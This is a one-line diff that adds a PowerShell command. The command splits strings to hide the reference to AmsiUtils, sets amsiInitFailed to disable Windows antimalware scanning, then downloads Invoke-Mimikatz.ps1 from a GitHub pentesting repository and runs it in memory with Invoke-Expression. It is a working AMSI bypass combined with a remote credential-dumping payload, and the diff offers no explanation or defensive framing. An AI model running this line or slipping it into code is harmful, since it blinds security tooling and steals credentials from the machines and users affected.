@@ -1,0 +1,1 @@
+$a='si';$b='Am';$Ref=[Ref].Assembly.GetType("System.Management.Automation.${b}${a}Utils");$z=$Ref.GetField("am${a}InitFailed",'NonPublic,Static');$z.SetValue($null,$true);$Y=New-Object Net.WebClient;$script=$Y.DownloadString("https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1");Invoke-Expression $script
